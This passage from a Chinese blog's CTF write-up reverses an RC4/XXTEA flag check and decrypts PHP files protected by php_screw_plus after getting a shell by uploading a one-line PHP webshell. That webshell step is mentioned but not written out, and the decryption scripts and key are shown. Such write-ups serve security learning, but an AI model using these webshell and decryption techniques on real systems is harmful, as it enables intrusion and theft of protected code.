class="keyword">char</span> *v3; <span class="comment">// r4</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v5[<span class="number">260</span>]; <span class="comment">// [sp+0h] [bp-118h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3 = (<span class="keyword">char</span> *)z(a1, a3);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(v3) != <span class="number">36</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v5, <span class="number">0</span>, <span class="number">0x100</span>u);</span><br><span class="line">  z2(v5, (<span class="keyword">unsigned</span> __int8 *)d, <span class="number">0x10</span>u);</span><br><span class="line">  z3(v5, (<span class="keyword">unsigned</span> __int8 *)v3, <span class="number">0x24</span>u);</span><br><span class="line">  z4((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)v3, <span class="number">9u</span>, d);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">memcmp</span>(v3, &amp;ss, <span class="number">0x24</span>u) == <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>上面z2，z3就是rc4的初始化和加密，看z4：相当清晰的xxtea，确定只是改了delat。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> __<span class="function">fastcall <span class="title">z4</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> *a1, <span class="keyword">unsigned</span> <span class="keyword">int</span> a2, <span class="keyword">unsigned</span> <span class="keyword">int</span> *a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// r9</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v6; <span class="comment">// r4</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// lr</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> result; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v9; <span class="comment">// r10</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// r1</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// r3</span></span><br><span class="line"></span><br><span class="line">  v3 = a2 - <span class="number">1</span>;</span><br><span class="line">  v6 = a1[a2 - <span class="number">1</span>];</span><br><span class="line">  v7 = sub_1258(<span class="number">52</span>) + <span class="number">6</span>;</span><br><span class="line">  result = <span class="number">-1621657930</span>;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v7 &gt;= <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v9 -= <span class="number">1621657930</span>;</span><br><span class="line">    --v7;</span><br><span class="line">    v10 = <span class="number">0</span>;</span><br><span class="line">    v11 = (v9 &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">while</span> ( v3 != v10 )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = ((((<span class="number">4</span> * a1[v10 + <span class="number">1</span>]) ^ (v6 &gt;&gt; <span class="number">5</span>)) + ((a1[v10 + <span class="number">1</span>] &gt;&gt; <span class="number">3</span>) ^ (<span class="number">16</span> * v6))) ^ ((a3[v10 &amp; <span class="number">3</span> ^ v11] ^ v6)</span><br><span class="line">                                                                                  + (a1[v10 + <span class="number">1</span>] ^ v9)))</span><br><span class="line">         + a1[v10];</span><br><span class="line">      a1[v10++] = v6;</span><br><span class="line">    &#125;</span><br><span class="line">    result = (((<span class="number">4</span> * *a1) ^ (v6 &gt;&gt; <span class="number">5</span>)) + ((*a1 &gt;&gt; <span class="number">3</span>) ^ (<span class="number">16</span> * v6))) ^ ((*a1 ^ v9) + (a3[v3 &amp; <span class="number">3</span> ^ v11] ^ v6));</span><br><span class="line">    v6 = result + a1[v3];</span><br><span class="line">    a1[v3] = v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>找密文，用之前逆xxtea写的脚本解一下，然后找rc4异或序列异或一下即可：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> len = <span class="number">9</span>; <span class="comment">//长度是输入字符串长度/4，因为加密是32位为一个单位</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> delat = <span class="number">0x60A8894A</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> key[] = &#123;<span class="number">0x1</span>, <span class="number">0x10</span>, <span class="number">0x100</span>, <span class="number">0x1000</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> enc[] =</span><br><span class="line">&#123;</span><br><span class="line">   <span class="number">0x68E5973E</span>, <span class="number">0xC20C7367</span>, <span class="number">0x98AFD41B</span>, <span class="number">0xFE4B9DE2</span>, <span class="number">0x01A5B60B</span>,</span><br><span class="line"><span class="number">0x3D36D646</span>, <span class="number">0xDBCC7BAF</span>, <span class="number">0xA0414F00</span>, <span class="number">0x762CE71A</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">get_sum</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">unsigned</span> <span class="keyword">int</span> delat)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">52</span>/n+<span class="number">6</span>; i++)</span><br><span class="line">sum -= delat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">de_xxtea</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> sum = get_sum(len, delat);</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> sum1 = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)(sum &gt;&gt; <span class="number">2</span>);</span><br><span class="line">        enc[len<span class="number">-1</span>] -= ((key[((len<span class="number">-1</span>)^sum1)&amp;<span class="number">3</span>]^enc[len<span class="number">-2</span>])+(enc[<span class="number">0</span>]^sum)) ^ (((<span class="number">4</span>*enc[<span class="number">0</span>])^(enc[len<span class="number">-2</span>]&gt;&gt;<span class="number">5</span>))+((<span class="number">16</span>*enc[len<span class="number">-2</span>])^(enc[<span class="number">0</span>]&gt;&gt;<span class="number">3</span>)));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> i = len<span class="number">-2</span>;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            enc[i] -= ((key[(i^sum1)&amp;<span class="number">3</span>]^enc[i<span class="number">-1</span>])+(enc[i+<span class="number">1</span>]^sum)) ^ (((<span class="number">4</span>*enc[i+<span class="number">1</span>])^(enc[i<span class="number">-1</span>]&gt;&gt;<span class="number">5</span>))+((<span class="number">16</span>*enc[i<span class="number">-1</span>])^(enc[i+<span class="number">1</span>]&gt;&gt;<span class="number">3</span>)));</span><br><span class="line">            i--; </span><br><span class="line">        &#125;<span class="keyword">while</span>(i != <span class="number">0</span>);</span><br><span class="line">        enc[<span class="number">0</span>] -= ((key[(<span class="number">0</span>^sum1)&amp;<span class="number">3</span>]^enc[len<span class="number">-1</span>])+(enc[<span class="number">1</span>]^sum)) ^ (((<span class="number">4</span>*enc[<span class="number">1</span>])^(enc[len<span class="number">-1</span>]&gt;&gt;<span class="number">5</span>))+((<span class="number">16</span>*enc[len<span class="number">-1</span>])^(enc[<span class="number">1</span>]&gt;&gt;<span class="number">3</span>)));</span><br><span class="line"></span><br><span class="line">        sum += delat;</span><br><span class="line">    &#125;<span class="keyword">while</span>(sum != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    de_xxtea();</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">4</span>*len; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d, "</span>, ((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)&amp;enc)[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//86, 4, 176, 212, 156, 99, 77, 48, 150, 206, 192, 5, 147, 190, 59, 130, 82, 75, 22, 178, 138, 51, 183, 77, 109, 123, 153, 80, 194, 177, 12, 18, 225, 132, 10, 147</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>s = [<span class="number">0x00</span>, <span class="number">0x59</span>, <span class="number">0xE3</span>, <span class="number">0x80</span>, <span class="number">0xD3</span>, <span class="number">0x67</span>, <span class="number">0x42</span>, <span class="number">0x33</span>, <span class="number">0x96</span>, <span class="number">0xC4</span>, <span class="number">0xC6</span>, <span class="number">0x0D</span>, <span class="number">0x94</span>, <span class="number">0xBD</span>, <span class="number">0x6E</span>, <span class="number">0xD2</span>, <span class="number">0x5D</span>, <span class="number">0x18</span>, <span class="number">0x48</span>, <span class="number">0xB3</span>, <span class="number">0x8E</span>, <span class="number">0x32</span>, <span class="number">0xE0</span>, <span class="number">0x46</span>, <span class="number">0x38</span>, <span class="number">0x77</span>, <span class="number">0x9B</span>, <span class="number">0x54</span>, <span class="number">0xCE</span>, <span class="number">0xB0</span>, <span class="number">0x5F</span>, <span class="number">0x19</span>, <span class="number">0xE2</span>, <span class="number">0x81</span>, <span class="number">0x5E</span>, <span class="number">0xD8</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t = <span class="string">"012345678901234567890123456789123456"</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>t</span><br><span class="line"><span class="string">'012345678901234567890123456789123456'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans = [ord(t[i])^s[i] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">36</span>)]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ans</span><br><span class="line">[<span class="number">48</span>, <span class="number">104</span>, <span class="number">209</span>, <span class="number">179</span>, <span class="number">231</span>, <span class="number">82</span>, <span class="number">116</span>, <span class="number">4</span>, <span class="number">174</span>, <span class="number">253</span>, <span class="number">246</span>, <span class="number">60</span>, <span class="number">166</span>, <span class="number">142</span>, <span class="number">90</span>, <span class="number">231</span>, <span class="number">107</span>, <span class="number">47</span>, <span class="number">112</span>, <span class="number">138</span>, <span class="number">190</span>, <span class="number">3</span>, <span class="number">210</span>, <span class="number">117</span>, <span class="number">12</span>, <span class="number">66</span>, <span class="number">173</span>, <span class="number">99</span>, <span class="number">246</span>, <span class="number">137</span>, <span class="number">110</span>, <span class="number">43</span>, <span class="number">209</span>, <span class="number">181</span>, <span class="number">107</span>, <span class="number">238</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>e = [<span class="number">86</span>, <span class="number">4</span>, <span class="number">176</span>, <span class="number">212</span>, <span class="number">156</span>, <span class="number">99</span>, <span class="number">77</span>, <span class="number">48</span>, <span class="number">150</span>, <span class="number">206</span>, <span class="number">192</span>, <span class="number">5</span>, <span class="number">147</span>, <span class="number">190</span>, <span class="number">59</span>, <span class="number">130</span>, <span class="number">82</span>, <span class="number">75</span>, <span class="number">22</span>, <span class="number">178</span>, <span class="number">138</span>, <span class="number">51</span>, <span class="number">183</span>, <span class="number">77</span>, <span class="number">109</span>, <span class="number">123</span>, <span class="number">153</span>, <span class="number">80</span>, <span class="number">194</span>, <span class="number">177</span>, <span class="number">12</span>, <span class="number">18</span>, <span class="number">225</span>, <span class="number">132</span>, <span class="number">10</span>, <span class="number">147</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>flag = [ans[i]^e[i] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">36</span>)]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>flag</span><br><span class="line">[<span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">123</span>, <span class="number">49</span>, <span class="number">57</span>, <span class="number">52</span>, <span class="number">56</span>, <span class="number">51</span>, <span class="number">54</span>, <span class="number">57</span>, <span class="number">53</span>, <span class="number">48</span>, <span class="number">97</span>, <span class="number">101</span>, <span class="number">57</span>, <span class="number">100</span>, <span class="number">102</span>, <span class="number">56</span>, <span class="number">52</span>, <span class="number">48</span>, <span class="number">101</span>, <span class="number">56</span>, <span class="number">97</span>, <span class="number">57</span>, <span class="number">52</span>, <span class="number">51</span>, <span class="number">52</span>, <span class="number">56</span>, <span class="number">98</span>, <span class="number">57</span>, <span class="number">48</span>, <span class="number">49</span>, <span class="number">97</span>, <span class="number">125</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>bytes(flag)</span><br><span class="line"><span class="string">b'flag&#123;194836950ae9df840e8a94348b901a&#125;'</span></span><br></pre></td></tr></table></figure><h3 id="so-get-source"><a href="#so-get-source" class="headerlink" title="so_get_source"></a>so_get_source</h3><p>进入网站，上传一个一句化木马拿到shell，然后把网站打包下来。</p><p><img src="/2021/08/01/2021%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/image-20210801094123439.png" alt="image-20210801094123439"></p><p>发现flag.php与index.php都是被加密后的，而这里有一个可疑的php_screw_plus.so文件，这和逆向就更贴近了。</p><p>搜索一下php_screw_plus.so，发现这个就是对我们的php文件实现加解密功能的文件。</p><p>到ida中去找到<strong>pm9screw_ext_fopen</strong>函数：打开待加密或者解密的文件。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">FILE *__<span class="function">fastcall <span class="title">pm9screw_ext_fopen</span><span class="params">(FILE *stream)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> __m128i *v1; <span class="comment">// rax</span></span><br><span class="line">  __m128i v2; <span class="comment">// xmm0</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  _QWORD *v4; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// rdx</span></span><br><span class="line">  _OWORD *v6; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v7; <span class="comment">// er12</span></span><br><span class="line">  __int64 v8; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v9; <span class="comment">// rax</span></span><br><span class="line">  __int64 v10; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">char</span> v11; <span class="comment">// cl</span></span><br><span class="line">  FILE *v12; <span class="comment">// rax</span></span><br><span class="line">  FILE *v13; <span class="comment">// rbp</span></span><br><span class="line">  __m128i v15; <span class="comment">// [rsp+0h] [rbp-138h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// [rsp+1Ch] [rbp-11Ch] BYREF</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">stat_buf</span>;</span> <span class="comment">// [rsp+20h] [rbp-118h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> nptr[<span class="number">16</span>]; <span class="comment">// [rsp+B0h] [rbp-88h] BYREF</span></span><br><span class="line">  __m128i v19; <span class="comment">// [rsp+C0h] [rbp-78h]</span></span><br><span class="line">  __m128i v20; <span class="comment">// [rsp+D0h] [rbp-68h] BYREF</span></span><br><span class="line">  __m128i v21; <span class="comment">// [rsp+E0h] [rbp-58h]</span></span><br><span class="line">  __int128 v22; <span class="comment">// [rsp+F0h] [rbp-48h]</span></span><br><span class="line">  __int128 v23; <span class="comment">// [rsp+100h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v24; <span class="comment">// [rsp+118h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v24 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v20 = <span class="number">0L</span>L;</span><br><span class="line">  v21 = <span class="number">0L</span>L;</span><br><span class="line">  v22 = <span class="number">0L</span>L;</span><br><span class="line">  v23 = <span class="number">0L</span>L;</span><br><span class="line">  v15 = <span class="number">0L</span>L;</span><br><span class="line">  v1 = (<span class="keyword">const</span> __m128i *)md5(<span class="string">"GH65Hws2jedf3fl3MeK"</span>);</span><br><span class="line">  v20 = _mm_loadu_si128(v1);</span><br><span class="line">  v19 = v20;</span><br><span class="line">  v2 = _mm_load_si128(&amp;v15);</span><br><span class="line">  v21 = _mm_loadu_si128(v1 + <span class="number">1</span>);</span><br><span class="line">  *(__m128i *)nptr = v2;</span><br><span class="line">  v3 = fileno(stream);</span><br><span class="line">  __fxstat(<span class="number">1</span>, v3, &amp;stat_buf);</span><br><span class="line">  v16 = stat_buf.st_size;</span><br><span class="line">  v4 = <span class="built_in">malloc</span>(<span class="number">0x200000</span>uLL);</span><br><span class="line">  v5 = v16;</span><br><span class="line">  *v4 = <span class="number">0L</span>L;</span><br><span class="line">  v6 = v4;</span><br><span class="line">  __fread_chk(v4, <span class="number">0x200000</span>LL, v5, <span class="number">1L</span>L, stream);</span><br><span class="line">  v7 = teg_yek(stream);</span><br><span class="line">  fclose(stream);</span><br><span class="line">  <span class="keyword">if</span> ( *(_OWORD *)&amp;v19 == *v6 )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v16;</span><br><span class="line">    <span class="keyword">if</span> ( v16 &gt; <span class="number">16</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v9 = <span class="number">16L</span>L;</span><br><span class="line">      v10 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(v16 - <span class="number">17</span>) + <span class="number">17L</span>L;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v11 = *((_BYTE *)v6 + v9);</span><br><span class="line">          <span class="keyword">if</span> ( v9 &gt; <span class="number">0x1F</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          *((_BYTE *)&amp;stat_buf.__unused[<span class="number">1</span>] + v9++) = v11;</span><br><span class="line">          <span class="keyword">if</span> ( v10 == v9 )</span><br><span class="line">            <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">        &#125;</span><br><span class="line">        *((_BYTE *)v6 + v9++ - <span class="number">32</span>) = v11;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v10 != v9 );</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_7:</span><br><span class="line">    screw_aes(<span class="number">0L</span>L, v6, v8, &amp;v20, &amp;v16, v7, v15.m128i_i64[<span class="number">0</span>], v15.m128i_i64[<span class="number">1</span>]);</span><br><span class="line">    v16 = strtol(nptr, <span class="number">0L</span>L, <span class="number">10</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v12 = tmpfile();</span><br><span class="line">  v13 = v12;</span><br><span class="line">  <span class="keyword">if</span> ( v16 &lt;= <span class="number">0</span> )</span><br><span class="line">    fwrite(<span class="string">"ACCESS DENIED"</span>, <span class="number">0xD</span>uLL, <span class="number">1u</span>LL, v12);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    fwrite(v6, v16, <span class="number">1u</span>LL, v12);</span><br><span class="line">  <span class="built_in">free</span>(v6);</span><br><span class="line">  rewind(v13);</span><br><span class="line">  <span class="keyword">return</span> v13;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>都有函数名的，所以分析起来难度不大，主要就是一个aes_256_cbc加密，我们只需要找密钥，iv在这里就是不需要的，因为iv的错误只会影响前16字节的解密，我们猜测程序的flag放在16字节后，因为iv我没找到，感觉不好找。</p><p>首先是一个对<strong>GH65Hws2jedf3fl3MeK</strong>进行md5加密，追踪变量，发现它的结果是作为了后面aes_256_cbc的密钥。</p><p><img src="/2021/08/01/2021%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/image-20210801101838900.png" alt="image-20210801101838900"></p><p>但这里有一个问题，md5加密结果是16字节，而这里密钥是256位的，要32字节嗯。。</p><p>然后看看md5函数及外面取结果的函数：</p><p><img src="/2021/08/01/2021%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/image-20210801102132852-16283937318661.png" alt="image-20210801102132852"></p><p><img src="/2021/08/01/2021%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/image-20210801102147464.png" alt="image-20210801102147464"></p><p>所以说，程序是直接使用的加密结果的hex形式作为32位密钥。</p><p>接下来使用openssl来解密试试，-d：解密  -K：指定密钥，-iv：指定iv，-in：指定要加密或解密的文件，且注意key和iv要以hex形式给出</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl aes-256-cbc -d -K 3834326434326239383837366635383166306466626566623063643262356333 -iv 1 -<span class="keyword">in</span> flag.php &gt; ans.txt</span><br></pre></td></tr></table></figure><p>解密，得到一个乱码文件。</p><p>再次回到程序中分析加密函数：发现在加密之后有一个异或，解密之前同样对应一个异或。</p><p><img src="/2021/08/01/2021%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/image-20210801102919133.png" alt="image-20210801102919133"></p><p>而这个v9，我向上找该变量的赋值及回溯，在读文件这里找到。。但这也是不知道的。</p><p><img src="/2021/08/01/2021%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2/image-20210801103055301.png" alt="image-20210801103055301"></p><p>好在上面异或的v9变量只是一个字节，所以考虑爆破，找到flag/</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">"flag1.php"</span>, <span class="string">"rb"</span>)</span><br><span class="line">text = f.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">255</span>):</span><br><span class="line">f1 = open(<span class="string">'flag.php'</span>, <span class="string">"wb"</span>)</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> text:</span><br><span class="line">f1.write(bytes([j^i]))</span><br><span class="line">os.system(<span class="string">'openssl aes-256-cbc -d -K 3834326434326239383837366635383166306466626566623063643262356333 -iv 1 -in flag.php &gt; ans.txt'</span>)</span><br><span class="line">a = open(<span class="string">'ans.txt'</span>, <span class="string">'rb'</span>)</span><br><span class="line">ans = a.read()</span><br><span class="line"><span class="keyword">if</span> <span class="string">b'flag'</span> <span class="keyword">in</span> ans:</span><br><span class="line">print(<span class="string">"*"</span>*<span class="number">100</span>)</span><br><span class="line">print(i)</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>解密结果：（这里我去除了解密结果中的开始的16字节乱码字符，因为它会导致的我博客使用的gulp出错。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">****************flag&#123;<span class="number">47</span>a3f7b1<span class="number">-499</span>c<span class="number">-4e45</span>-ed3e<span class="number">-404602</span>cfef96&#125;<span class="string">";</span></span><br><span class="line"><span class="string"></span></span><br><span class="line">echo "no my code&lt;/</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>应用密码学</title>
      <link href="/2021/04/17/%E5%BA%94%E7%94%A8%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
      <url>/2021/04/17/%E5%BA%94%E7%94%A8%E5%AF%86%E7%A0%81%E5%AD%A6/</url>
      
